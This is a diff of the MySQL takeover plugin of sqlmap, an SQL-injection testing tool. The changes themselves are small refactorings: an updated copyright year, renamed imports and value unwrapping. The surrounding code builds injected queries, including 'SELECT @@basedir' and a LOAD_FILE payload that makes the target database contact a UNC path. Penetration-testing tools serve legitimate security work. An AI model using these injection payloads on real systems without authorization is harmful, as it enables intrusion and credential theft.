@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
@@ -9,15 +9,15 @@ import re
 
 from lib.core.agent import agent
 from lib.core.common import Backend
-from lib.core.common import isTechniqueAvailable
+from lib.core.common import isStackingAvailable
 from lib.core.common import normalizePath
 from lib.core.common import ntToPosixSlashes
 from lib.core.common import randomStr
+from lib.core.common import unArrayizeValue
 from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.data import paths
 from lib.core.enums import OS
-from lib.core.enums import PAYLOAD
 from lib.request import inject
 from lib.request.connect import Connect as Request
 from plugins.generic.takeover import Takeover as GenericTakeover
@@ -40,7 +40,7 @@ class Takeover(GenericTakeover):
                 logger.info("retrieving MySQL base directory absolute path")
 
                 # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_basedir
-                self.__basedir = inject.getValue("SELECT @@basedir")
+                self.__basedir = unArrayizeValue(inject.getValue("SELECT @@basedir"))
 
                 if re.search("^[\w]\:[\/\\\\]+", self.__basedir, re.I):
                     Backend.setOs(OS.WINDOWS)
@@ -99,7 +99,7 @@ class Takeover(GenericTakeover):
             logger.debug("keeping existing UDF '%s' as requested" % udf)
 
     def uncPathRequest(self):
-        if not isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
+        if not isStackingAvailable():
             query = agent.prefixQuery("AND LOAD_FILE('%s')" % self.uncPath)
             query = agent.suffixQuery(query)
             payload = agent.payload(newValue=query)
